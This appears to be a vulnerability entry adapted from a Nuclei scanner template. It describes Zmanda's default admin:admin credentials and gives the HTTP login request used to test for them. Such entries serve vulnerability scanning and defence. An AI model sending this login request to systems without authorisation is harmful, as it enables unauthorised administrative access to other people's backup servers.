# Vulnerability: Zmanda Default Login
**Classification:** CWE-522
**Source:** Nuclei Template (`zmanda-default-login.yaml`)

## Description
Zmanda default admin credentials admin:admin were discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /ZMC_Admin_Login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Cookie: zmc_cookies_enabled=true

login=AEE&last_page=&username={{username}}&password={{password}}&submit=Login&JS_SWITCH=JS_ON
```

